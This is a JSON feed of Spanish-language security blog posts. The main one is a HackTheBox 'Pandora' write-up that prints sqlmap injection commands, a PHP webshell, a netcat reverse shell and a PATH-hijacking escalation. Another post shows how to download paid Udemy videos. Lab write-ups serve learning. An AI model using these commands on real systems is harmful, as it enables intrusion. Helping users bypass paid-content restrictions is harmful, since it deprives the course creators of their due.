[
  
  {
    "title": "Pandora HackTheBox",
    "url": "/posts/pandora-hackthebox/",
    "categories": "HTB",
    "tags": "HackTheBox, Writeup, SQLI, LocalPortForwarding, PATH-Hijacking, UDP, snmp, 2022",
    "date": "2022-05-18 19:51:00 -0400",
    





    "snippet": "Bienvenidos/aEste art√≠culo tratar√° la resoluci√≥n de la m√°quina Pandora de la plataforma de Ciberseguridad HackTheBox.Informaci√≥n sobre la m√°quinaBueno, esta m√°quina tiene una dificultad f√°cil, pero digo desde ya que no es una m√°quina f√°cil, ja, ja. Muy divertida y aprend√≠ bastantes cosas en su momento. Sin duda mi m√°quina favorita &amp;lt;3.Matrix  SQLI (Sql Injection)  SNMP (Protocolo simple de administraci√≥n de red)  UDP  Path Hijacking  CVE-2021-32099  Local Port ForwardingReconocimientoNmap (TCP-UDP)nmap -sSU --min-rate 12000 -Pn -n -p- --open -v 10.10.11.136nmap -sS -sCV -n -p 22,80 -T5 -Pn -n -v 10.10.11.136nmap -sU -sCV -n -p 161 -T5 -Pn -v 10.10.11.136Procedemos a buscar exploits p√∫blicos que afecten a las versiones de estos servicios, pero no encontramos nada interesante.Servidor WebDemos un vistazo a lo que almacena el servidor web.Pues al parecer el servidor web almacena un sitio web est√°tico y poco podr√≠amos hacer, pero conseguimos un dominio.Procedemos a agregar el dominio.vim /etc/hostsYa estar√≠a haciendo la resoluci√≥n DNS, podr√≠amos buscar subdominios, pero los tiros no van por ah√≠.SNMPAhora nos queda el SNMP.Buscando un poco encontramos bastante informaci√≥n (dejar√© los recursos al final) vamos a emplear la herramienta snmpwalk.Al ejecutar la herramienta nos da informaci√≥n bastante √∫til como la versi√≥n del Kernel Linux y un posible usuario (Daniel).Incluso podemos ver procesos que se est√°n ejecutando.Luego de esperar un poco encontramos unas credenciales (yo env√≠e la salida del comando a un fichero para luego filtrar).snmpwalk -v 2c -c public 10.10.11.136 &amp;gt; snmpIntrusi√≥nSSHVamos a verificar que las credenciales obtenidas anteriormente sean v√°lidas.ssh daniel@panda.htb /* HotelBabylon23 */Estamos dentro ;).Ahora a enumerar un poco el sistema.Vemos que hay otro usuario llamado Matt.Al ingresar al directorio del usuario Matt vemos que est√° el flag, pero lamentablemente no tenemos permisos de lectura ni escritura.Al listar el directorio /var/www/ vemos que est√° el sitio web est√°tico y hay una aplicaci√≥n web que no tenemos acceso.Tambi√©n est√° corriendo el servicio MySQL.Podemos saber esto de dos formas viendo que servicios est√°n en escucha y ver si el demonio de MySQL est√° corriendo.netstat -lt /* -l:escuha y -t:TCP */systemctl status mysqlEntonces con esta informaci√≥n recopilada estamos seguro de que los tiros van con la aplicaci√≥n web.Local Port ForwardingPara poder acceder a la aplicaci√≥n web vamos a emplear una t√©cnica de pivoting que se conoce como Local port forwarding.  No es m√°s que traer los servicios que corren en los diferentes puertos de la m√°quina objetiva a nuestra m√°quina y as√≠ poder acceder a ellos, ya que esos servicios son internos y no est√°n expuestos.  ssh -L 1313:localhost:80 daniel@panda.htb /* :tu_puerto:localhost:puerto-de-la-m√°quina host-remoto */    Explotaci√≥nBueno, ya tendr√≠amos acceso a la aplicaci√≥n web, toca buscar alg√∫n CVE que afecte a la versi√≥n de Pandora FMS.Luego de buscar hay varios CVEs que afectan, pero ninguno funcional, ya que la versi√≥n est√° con parches.  Busquemos ‚Äúpandora v7 742 CVE‚Äù. Nos encontramos un blog bastante suculento que explica a detalle las diferentes vulnerabilidades que afectan a esa versi√≥n de Pandora FMS.Lo que m√°s llama la atenci√≥n es la SQLI a buscar por el CVE si hay alg√∫n tipo de exploit, pero ya con leer un poco el blog (o buscar informaci√≥n en otra parte acerca de la vulnerabilidad) ya podr√≠amos explotar nosotros la vulnerabilidad.El fichero chart_generator.php contiene el par√°metro vulnerable session_id.SQLIPara explotar la vulnerabilidad de inyecci√≥n SQL usar√© la herramienta sqlmap, ya que todav√≠a no s√© explotar una SQLI manual de manera correcta.sqlmap --url &quot;http://localhost:1313/pandora_console/include/chart_generator.php?session_id=&quot; --random-agent -o --level=5 --risk=3 --method=&quot;GET&quot; --cookie=&quot;jm3i5g44ifdfl3417p9gnh9nur&quot; --dbms=mysql --tamper=space2comment --dbs Ahora nos queda encontrar la tabla que almacena el valor de la cookie con el usuario admin y as√≠ poder acceder a la dashboard.sqlmap --url &quot;http://localhost:1313/pandora_console/include/chart_generator.php?session_id=&quot; --random-agent -o --level=5 --risk=3 --method=&quot;GET&quot; --cookie=&quot;jm3i5g44ifdfl3417p9gnh9nur&quot; --dbms=mysql -D pandora --tablesBastantes, tablas, ja, ja, ja. Luego de estar un buen ratito buscando la tabla correcta, la que m√°s llama la atenci√≥n es tsessions_php.sqlmap --url &quot;http://localhost:1313/pandora_console/include/chart_generator.php?session_id=&quot; --random-agent -o --level=5 --risk=3 --method=&quot;GET&quot; --cookie=&quot;jm3i5g44ifdfl3417p9gnh9nur&quot; --dbms=mysql -D pandora -T tsessions_php --dumpBueno, ahora solo hay que encontrar el valor de la cookie correcto (PHPSESSID) y as√≠ poder hacer un robo de sesi√≥n.Para cambiar el valor de la cookie hay dos formas de hacerlo con una extensi√≥n en tu navegador web o desde las mismas herramientas de desarrollador.Remplazos el valor haciendo doble clic.Y listo evadimos el login.Ahora solo necesitamos conseguir una Shell y esto lo podr√≠amos hacer subiendo una webshell.Pero hay un problema con este usuario, no podemos hacer mucho, ya que no cuenta con los privilegios adecuados, tendremos que conseguir la sesi√≥n del admin.  Tambi√©n en un repo est√° el PoC del CVE, donde est√° la sentencia SQL maliciosa, ya que √©l lo exploto de forma manual..Ya estamos como el usuario admin (;.WebShellPara subir nuestra webshell no vamos al sidebar Admin tools y luego File manager.Yo utilizare esta webshell.&amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;Listo, ahora nos queda ir al PATH (/pandora_console/images/backgrounds/webshell.php).Ahora que tenemos un RCE nos queda entablarnos la Reverse Shell.rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.121 1212 &amp;gt;/tmp/fnc -lvnp 1212 Listo obtenemos la Shell ahora a leer el flag y luego el privesc.Escalada de privilegiosEnumerando un poco el sistema no tenemos nada interesante en crontabs, grupos pero si en binarios SUID.Ese binario no es nada com√∫n. ü§î A ejecutar el binario. üéâLo que m√°s me llama la atenci√≥n es tar y por deducci√≥n que trata de descomprimir el fichero comprimido.Podr√≠amos subir pspy para visualizar procesos en tiempo real y ver si obtenemos un poco m√°s de informaci√≥n.PATH HIJACKINGCon el binario tar porque pandora_backup lo utiliza.  El PATH hijacking no es m√°s que enga√±ar de alguna forma el lugar de la ejecuci√≥n del binario, ya que gracias a la variable de entorno $PATH ira viendo si se encuentra el binario . Ejemplo m√°s concretoSi yo quiero ejecutar el binario passwd ira recorriendo cada ruta de la asignacion de la variable de entorno $PATH en busca de ese binarioYo puedo enga√±ar para que se ejecute el binario malicioso antes y no el binario leg√≠timo.  Para simular el binario tar lo har√© con el lenguaje de programaci√≥n C (algo simple).Ahora a la acci√≥n. üí£PoCJa, ja, ja, un √©pico fail.Probar√© conect√°ndome a trav√©s de SSH al usuario Matt , ya que por alguna raz√≥n no me da la Shell como root.echo &quot;/bin/bash&quot; &amp;gt; tar &amp;amp;&amp;amp; chmod +x tar &amp;amp;&amp;amp; ls -l tar &amp;amp;&amp;amp; echo $PATH &amp;amp;&amp;amp; export PATH=.:$PATH &amp;amp;&amp;amp; /usr/bin/pandora_backup¬°Listo!, al final explotamos de una manera diferente como quer√≠a yo (por problemas de librer√≠as que no ten√≠a instalada la m√°quina), pero es lo mismo.FinDisculpad si est√° mal redactado o errores de escritura y si me he equivocado en alg√∫n concepto/termino.  Gracias a  Mario Guglia porque me ayudo con la m√°quina cuando hab√≠a salido, ya que quede stuck y a s4ori que me explico acerca del Local port forwading porque no sab√≠a sobre esta t√©cnica.Cualquier feedback es bienvenido me pueden contactarpor Twitter y Telegram."
  },
  
  {
    "title": "Descargar videos de Udemy",
    "url": "/posts/descargar-videos-de-udemy/",
    "categories": "Tutorial",
    "tags": "T3sla, Udemy, Tutorial, 2022",
    "date": "2022-04-07 09:25:00 -0400",
    





    "snippet": "Bienvenidos/aEste art√≠culo (post) tratar√° de como descargar los videos de Udemy.HerramientasHerramientas que vamos a emplear.  Navegador Web, en mi caso usar√© el navegador web Google Chrome.Tambi√©n puedes utilizar otro navegador web como Mozilla Firefox entre otros‚Ä¶  Wget para descargar el fichero mp4.  Dev Tools (Inspeccionar elemento). Abrir las Dev ToolsTenemos diferentes formas de abrir las Dev Tools. Veamos cu√°les son:      La m√°s normal es presionando los tres puntos que hay en la esquina superior derecha.Luego se despliega el men√∫ y hay que presionar en m√°s herramientas y luego en Herramientas para Desarrolladores    La segunda forma seria presionando la tecla F12.  La tercera forma seria haciendo click derecho.   Por √∫ltimo seria usando la combinaci√≥n de teclas CTRL + SHIFT + I Y tendr√≠amos las Dev Tools (Inspeccionar elemento).Dicho esto pasamos a la acci√≥n.DemoLo primero es seleccionar el curso que queremos descargar, yo lo har√© con dos cursos para el demo (Gratis y de pago).Este curso es gratis y est√° inhabilitada la caracter√≠stica de descargar la clase, pero con este peque√±o truco podremos (:Inspeccionemos elementoHacemos click derecho aqu√≠:Y nos muestra todo el HTML5 de la aplicaci√≥n web de Udemy.Como vemos en la siguiente captura de pantalla tenemos la fuente (atributo src; source)  de la etiqueta videoAbrimos el link en una nueva pesta√±a (tab) y descargamos a trav√©s de wget.Aqu√≠ cambio el nombre y habilito un servidor HTTP por el puerto 8080 para poder visualizar el video de una forma m√°s c√≥modaY listo tendr√≠amos el video descargado una manera bastante simple, pero efectiva (;Ahora lo har√© con un curso de pago, para que vean que aplica a todos los cursos, sean gratis o de pago.Listo es cosa de repetir los pasosFinBueno, eso ha sido el post de hoy, espero que les sea √∫til.No he visto este m√©todo para descargar los videos de Udemy- pero de seguro alguno ya lo sab√≠a.Cualquier feedback es bienvenido me pueden contactar- por Twitter y Telegram"
  },
  
  {
    "title": "Recursos de Ciberseguridad",
    "url": "/posts/recursos-ciberseguridad/",
    "categories": "Ciberseguridad",
    "tags": "Ciberseguridad, 2022, T3sla",
    "date": "2022-02-22 23:31:00 -0300",
    





    "snippet": "Bienvenidos/asEste post tratar√° de los mejores canales, blogs y apuntes de Ciberseguridad (a mi parecer, claro- que no son todos, pero son algunos que me ayudan mucho, no est√°n ordenados en plan cu√°l es- mejor, todos tienen contenido de calidad y sus creadores se esfuerzan).TheHackerWay  Quiz√°s muchos conocen este blog.  Cuenta con bastante post, para leer.  En este blog encontrar√°s diferentes t√©cnicas de Hacking.  Desde Post explotaci√≥n en sistemas operativos (SO) Windows y GNU/LINUX, diferentes- herramientas para Red Team y mucho m√°s.      ¬øQui√©n es el autor?   Daniel Echeverri (adastra).  S4vitar  Muchos conocer√°n este canal.  Encontrar√°s desde. Noticias de Ciberseguridad, consejos, writeups de m√°quinas de plataformas como HackTheBox, scripting en Bash y mucho m√°s.  Demasiados videos para ver, disfruta üòä.  Marcelo V√°zquez (s4vitar). Dejo su trabajo para dedicarse plenamente a la creaci√≥n de contenido. Tambi√©n s4vitar, cuenta con un blog donde sube art√≠culos interesantes. Dale un vistazo ‚â• https://s4vitar.github.io/. ¬øEstamos?V√≠ctor Garc√≠a (Takito1812)  Siento que este canal, deber√≠a ser m√°s conocido, ya que su contenido es bueno, explica bastante bien y se nota el esfuerzo que hay detr√°s.  Encontrar√°s, desde Writeups de m√°quinas de plataformas como HackThebox, TryHackMe. Una, gu√≠a de preparaci√≥n para la certificaci√≥n OSCP de Offensive Security.  Takito es una persona que admiro mucho y se nota que pilota del tema.          Takito,  tambi√©n cuenta con una comunidad, blog que es CybexSec, Cybex-Discord.      Securiters  Comenzaron, hace relativamente poco.  Encontrar√°s, desde Entrevistas, Resoluciones de m√°quinas de plataformas como- HackTheBox, TryHackMe, diferentes paths de aprendizaje y mucho m√°s.  Buenos videos para ver üòä.          Securiters, se conforma por:              Marta-Twitter        Carol-Twitter Securiters, es m√°s de usar Twitch. Securiters, tambi√©n cuenta con un Blog.            CronUp  Demasiados posts, para leer (Claro, yo no me he le√≠do todo üòÅ).  Los art√≠culos que he le√≠do, son bastante detallados y bien explicados. Claro no tan t√©cnicos, para que personas que no est√°n tan metidos en este mundo, sea f√°cil d√© entender (algunos mas que otros).  Encontrar√°s, investigaciones sobre malware, noticias y m√°s.          CronUP, es una empresa de Ciberseguridad Chilena.      DeepHacking  Unos art√≠culos guap√≠simos.  Encontrar√°s, desde explicaciones detalladas sobre vulnerabilidades en aplicaciones web como SQLI (SQL injection). Writeups de laboratorios de PortSwigger, reviews de- certificaciones y m√°s.  Muy bueno este blog üòä.          ¬øQui√©n es el autor? Sikumy. Tambi√©n tiene estos fabulosos apuntes, dale una vuelta ‚â• Hacking Notes.      sha-16  Encontrar√°s, desde Writeups de m√°quinas de plataformas como HackThebox y TryHackMe. Review de la certificaci√≥n eJPT, diferentes tutoriales, explica t√©cnicas y m√°s.  S√≠guelo en -&amp;gt; Twitch  Descubr√≠ su canal, hace un tiempo y me gusto su contenido üòÅ.          Tambi√©n cuenta con un Blog.      s1kr10s  Encontrar√°s, desde vulnerabilidades que ha encontrado, Writeups de retos de reversing y m√°s.  s1kr10s, es alguien que admiro demasiado y lo encuentro muy pro.  Para los que le gusta el reversing y entender las cosas a bajo nivel.          Tambi√©n, tiene un blog, con muy buen contenido.      Mario Guglia  Encontrar√°s, desde Writeups de m√°quinas de plataformas como HackTheBox y TryHackMe. AD (Active Directory) y art√≠culos interesantes.  Dale una vuelta üòÄ.  He tenido el placer de hablar con √©l, me ha ayudado y no dudar√° en echarte un cable üòâ.          üî•üí£      Jotinero  Un buen canal üòä.  Encontrar√°s, desde OSINT, ataques a redes inal√°mbricas, consejos y  m√°s.  Tambi√©n, es una persona que admiro y un amigo.          Disfruten üòä.      Paulo Colom√©s  Encontrar√°s, desde un curso donde ense√±a algunas t√©cnicas de hacking a redes LAN, configuraciones, conceptos de networking y m√°s.  Sin duda un gran profesional y explica demasiado bien.  Perfecto para los que le gusta networking, ¬°Que esperas!          üî•      HackPlayers  Encontrar√°s, desde Writeups, t√©cnicas, PoCs (Prueba de concepto) y m√°s.  Dale una vuelta üòâ.  Son los organizadores de la h-c0n.          Desarrollan herramientas como: evil-winrm.      IronHackers  Encontrar√°s, desde Writeups de plataformas como HackTheBox, Atenea, Vulnhub.Tutoriales, notas y m√°s.  Entra, que te gustara.          Tambi√©n, tienen canal de YouTube.       FinHasta aqu√≠ el post de hoy, posiblemente haga una serie de esto. Gracias por leer. Cualquier feedback es bienvenido, me pueden contactar por Twitter, Telegram y se pueden unir- a Moison-Telegram."
  },
  
  {
    "title": "Hola Mundo",
    "url": "/posts/hola-mundo/",
    "categories": "Bienvenida",
    "tags": "HolaMundo, 2022, T3sla, NOOB",
    "date": "2022-02-22 14:55:00 -0300",
    





    "snippet": "Hola a todos este es mi primer post, tratar√© de explicar de que tratara este blog.¬øQu√© encontrar√°s en este blog?  Hacking.  Diferentes plataformas de Ciberseguridad.  El lenguaje de programaci√≥n C.  Una que otra cosa que no sea relacionado con los temas del blog.  Apuntes.  Recursos.  Formula 1.  Videojuegos.  Anime.¬øQu√© me dio por crear un blog?La verdad tengo unas ganas enormes de crear contenido y darme de cierta forma a conocer. Adem√°s, siento que escribiendo reforzar√© mis conocimientos y aprender√©.  No soy ning√∫n experto, solo un entusiasta que busca tratar de crear contenido, aprender y mejorar, para alg√∫n d√≠a llegar a trabajar como un Pentester o Programador.Cualquier feedback es bienvenido usted es libre de expresarse como quiera."
  }
  
]

